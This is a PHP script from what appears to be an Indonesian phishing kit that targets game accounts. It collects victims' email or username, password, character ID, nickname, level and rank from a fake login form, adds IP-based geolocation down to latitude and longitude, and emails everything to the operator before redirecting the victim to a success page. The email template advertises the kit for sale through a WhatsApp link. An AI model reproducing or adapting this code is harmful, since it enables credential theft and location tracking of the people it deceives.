<?php 
// MENGAMBIL KONTROL 
include 'ryucodex/setting.php';
include 'ryucodex/location.php';
include 'ryucodex/callingcode.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$nickname = $_POST['nickname'];
$id = $_POST['userId'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$login = $_POST['login'];
$month = $_POST['month'];
$day = $_POST['day'];
$year = $_POST['year'];

$country  = $khcodes['country'];
$region   = $khcodes['region'];
$city     = $khcodes['city'];
$lat      = $khcodes['lat'];
$long     = $khcodes['lon'];
$ipAddr   = $khcodes['query'];

//MENDAPATKAN KODE PANGGILAN NEGARA
$callingcode = $ryuCalling['country_code'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $nickname == "" && $id == "" && $level == "" && $tier == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$resultFlags | +$callingcode | Login $login | Lv $level | Rank $tier";
$pesan = <<<EOD
	<center> 
<div style="background: url(https://i.ibb.co/5MvZjqJ/Pics-Art-04-05-12-58-54.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 150px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>Mau Beli Web Phising ? <br>Whatsapp <a href="https://wa.me/6282111025262"><b>Klik Disini</b></a></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Email/No Telp/Username</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$email</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Password</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$password</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Login</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$login</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>ID Karakter</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$id</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Nickname</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$nickname</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Level</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$level</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Tier</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$tier</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;">Informasi Device</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>IP Address</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$ipAddr</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Negara</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$country</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Region</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$region</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>City</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$city</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Latitude</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$lat</th> 
</tr>
<tr>
<th style="background: #87CEFA; width: 22%; text-align: left;" height="25px"><b>Longitude</th>
<th style="background: #87CEFA; width: 78%; text-align: center;"><b>$long</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;">© Copyright By Bagas Arya</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
</div>
</div>
</center>
EOD;
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);
include 'ryucodex/xyzGeolocation.php';

if($kirim) {
    session_start();
    $_SESSION['nickname'] = $nickname;
    header('location: success.php');
}
}
?>